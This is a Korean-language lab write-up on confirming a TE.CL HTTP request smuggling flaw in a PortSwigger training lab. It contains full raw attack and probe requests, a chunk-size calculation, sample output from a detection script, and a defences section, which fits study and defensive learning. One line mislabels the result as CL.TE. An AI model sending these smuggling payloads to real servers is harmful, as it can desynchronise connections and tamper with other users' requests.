# Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

## 개요

- **난이도**: Practitioner
- **주제**: HTTP Request Smuggling — TE.CL / Transfer-Encoding vs Content-Length / Differential Response
- **링크**: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses

## 목표

프론트엔드는 `Transfer-Encoding: chunked`, 백엔드는 `Content-Length` 를 기준으로 요청을 처리하는 TE.CL 구조에서, 스머글링된 요청이 다음 프로브 요청에 영향을 주어 다른 응답(404)이 반환되는 것을 확인한다.

## 001 랩(CL.TE)과의 비교

```
[CL.TE — 001 랩]
  프론트엔드: Content-Length  →  body 전체를 백엔드로 전달
  백엔드:    Transfer-Encoding → 0\r\n\r\n 에서 청크 종료, 이후 버퍼 잔류

  Attack body:
    0\r\n\r\n              ← 백엔드(TE)가 여기서 종료
    GET /smuggled ...      ← 버퍼에 잔류

  Probe: GET

[TE.CL — 이번 랩]
  프론트엔드: Transfer-Encoding → 청크 전체를 백엔드로 전달
  백엔드:    Content-Length     → CL 바이트만 읽고, 나머지 버퍼 잔류

  Attack body:
    [chunk_size]\r\n       ← 백엔드(CL)가 이 줄만 읽음
    POST /smuggled ...     ← 버퍼에 잔류
    0\r\n\r\n

  Probe: POST
```

## TE.CL 취약점 원리

```
[TE.CL 구조]
  프론트엔드: Transfer-Encoding 사용
  백엔드:    Content-Length 사용

[공격 요청]
  POST / HTTP/1.1
  Content-Length: 4        ← 백엔드 기준: body 4바이트만 읽음
  Transfer-Encoding: chunked

  a7\r\n                   ← 백엔드(CL): 이 4바이트를 body로 인식 → 종료
  POST /404 HTTP/1.1\r\n   ← 백엔드 버퍼에 잔류
  ...
  Content-Length: 150\r\n  ← 실제 body보다 큰 값 (핵심!)
  \r\n
  x=smuggled
  0\r\n
  \r\n

[프론트엔드 처리]
  Transfer-Encoding: chunked 기준으로 파싱
  → a7 = 167바이트 청크 전체를 읽음
  → 0\r\n\r\n 에서 종료
  → 전체를 백엔드로 전달

[백엔드 처리]
  Content-Length: 4 기준으로 파싱
  → "a7\r\n" 4바이트를 body로 읽음 → POST / 처리 완료 → 200 반환
  → 나머지("POST /404..." 이후 전체)는 TCP 버퍼에 잔류

[다음 요청(Probe POST) 도착 시]
  백엔드: 버퍼에서 POST /404 읽기 시작
  Content-Length: 150 → 실제 body("x=smuggled")는 10바이트
  chunk 종료 바이트("\r\n0\r\n\r\n") = 7바이트
  합계 17바이트 → 150에 133바이트 부족 → 연결 유지, 대기

  Probe POST 도착 → 133바이트를 smuggled body로 흡수
  백엔드: POST /404 처리 → 404 반환
  → 이 404가 Probe 응답으로 반환됨 → Differential Response!
```

## 공격 패킷

### Attack 요청 (스머글링 심기)

```http
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

a7
POST /404 HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150

x=smuggled
0

```

```
body 분석:
  "a7\r\n..." → 프론트엔드(TE): 청크 전체 전달

  백엔드(CL): "a7\r\n" 4바이트만 body → POST / → 200

  버퍼 잔류:
    POST /404 HTTP/1.1\r\n
    ...
    Content-Length: 150\r\n
    \r\n
    x=smuggled
    \r\n0\r\n\r\n   ← chunk 종료 표기 (7바이트)

chunk size(a7=167) 계산:
  POST /404 HTTP/1.1\r\n                     (20)
  Host: LAB-ID.net\r\n                       (65)
  Content-Type: application/x-www-...\r\n    (49)
  Content-Length: 150\r\n                    (21)
  \r\n                                        (2)
  x=smuggled                                 (10)
  ─────────────────────────────────────────
  합계: 167 = 0xa7
```

### Probe 요청 (Differential Response 확인)

```http
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
Connection: close

x=probe
```

```
백엔드에서의 실제 처리:
  버퍼(POST /404, CL=150) + Probe 바이트가 합쳐짐
  백엔드: Probe의 앞 133바이트를 smuggled body로 소비
  → 150바이트 완성 → POST /404 처리 → 404 반환
  → Probe 클라이언트는 404 수신 → CL.TE 취약점 확인!
```

## 핵심 — smuggled Content-Length를 크게 설정해야 하는 이유

```
[Content-Length = 실제 body와 동일 (잘못된 설정)]
  백엔드: body 읽기 완료 → POST /404 즉시 처리 → 404 반환
  단, 이 404는 공격 연결의 응답 큐에서 사라짐
  남은 "\r\n0\r\n\r\n" → 잘못된 요청 → 연결 종료
  Probe 도착 → 새 연결 → 정상 200 → 차이 없음 (탐지 실패)

[Content-Length > body + chunk 종료 바이트 (올바른 설정)]
  백엔드: body 읽기 중 → 아직 부족 → 연결 유지
  Probe 도착 → 같은 연결로 라우팅
  Probe 바이트로 나머지 body 채움 → POST /404 처리 → 404
  이 404가 Probe 응답으로 반환 → 탐지 성공!

최솟값: 실제 body(10) + chunk 종료(7) + 1 = 18 이상
권장값: 150 (probe 크기 내에서 충분히 큰 값)
```

## 도구 사용

```bash
python3 tools/09-te-cl-confirm.py \
  --host LAB-ID.web-security-academy.net \
  --smuggle-path /404notfound \
  --repeat 5

출력 예시:
  [*] 기준선: HTTP/1.1 200 OK
  [01] Attack: HTTP/1.1 200 OK   Probe: HTTP/1.1 404 Not Found  [★ DIFFERENT]
  [02] Attack: HTTP/1.1 200 OK   Probe: HTTP/1.1 404 Not Found  [★ DIFFERENT]
  ...
  [+] TE.CL 취약점 확인! (4/5회 differential response 발생)
```

## 방어

```
[근본 원인]
  프론트엔드(TE)와 백엔드(CL)가 요청 경계를 다르게 파악

[방어 방법]
  1. HTTP/2 사용
     바이너리 프레이밍으로 요청 경계 명확히 구분

  2. 백엔드 연결 재사용 비활성화
     요청마다 새 TCP 연결 → 버퍼 잔류 불가

  3. 프론트엔드/백엔드 동일 파싱 기준 사용
     RFC 7230: Content-Length + Transfer-Encoding 동시 존재 시 TE 우선
     → 양쪽이 동일하게 TE 우선 처리

  4. 두 헤더 동시 존재 시 요청 거부
```

## 핵심 정리

- TE.CL 스머글링은 프론트엔드(TE)와 백엔드(CL)의 **요청 경계 인식 차이**를 이용한다.
- 백엔드(CL)는 `Content-Length` 바이트(= chunk 크기 표기 줄)만 읽고, 나머지 chunked body를 **TCP 버퍼에 잔류**시킨다.
- smuggled request의 `Content-Length`는 실제 body보다 **반드시 크게** 설정해야 한다. 정확히 일치하면 백엔드가 smuggled 요청을 즉시 처리해버려 Probe에 영향을 주지 않는다.
- CL.TE와 달리 Probe도 **POST**로 전송해야 하며, smuggled request를 완성시킬 충분한 바이트를 제공해야 한다.

## 배운 점 및 추가 학습

### 1. CL.TE vs TE.CL 패킷 구조 비교

| 항목 | CL.TE (001) | TE.CL (이번) |
|------|-------------|--------------|
| 프론트엔드 | Content-Length | Transfer-Encoding |
| 백엔드 | Transfer-Encoding | Content-Length |
| Attack body | `0\r\n\r\n` + prefix | `[hex]\r\n` + smuggled POST |
| 버퍼 잔류 원인 | TE: 0\r\n\r\n 이후 무시 | CL: chunk size 줄만 읽음 |
| Probe 방식 | GET | POST |
| smuggled CL | 해당 없음 | 반드시 body보다 크게 |

### 2. chunk size 계산

```
smuggled 요청 전체 바이트 수를 16진수로 표기
= POST line + headers + \r\n + body

예:
  POST /404 HTTP/1.1\r\n                  20
  Host: LAB.web-security-academy.net\r\n  65
  Content-Type: application/...\r\n       49
  Content-Length: 150\r\n                 21
  \r\n                                     2
  x=smuggled                              10
  ──────────────────────────────────────
  167 = 0xa7   ← chunk size
```

### 3. 탐지 시 유의사항

```
- 반복 시도가 필요한 이유:
  프론트엔드 커넥션 풀링으로 Attack과 Probe가
  다른 백엔드 연결로 라우팅될 수 있음
  → 같은 백엔드 연결에 도달할 때까지 반복

- CL.TE 의심 시 TE.CL도 테스트:
  타임아웃 발생 → TE.CL 가능성 (백엔드가 CL만큼 기다리다 타임아웃)
  즉각 다른 응답 → CL.TE 가능성
```
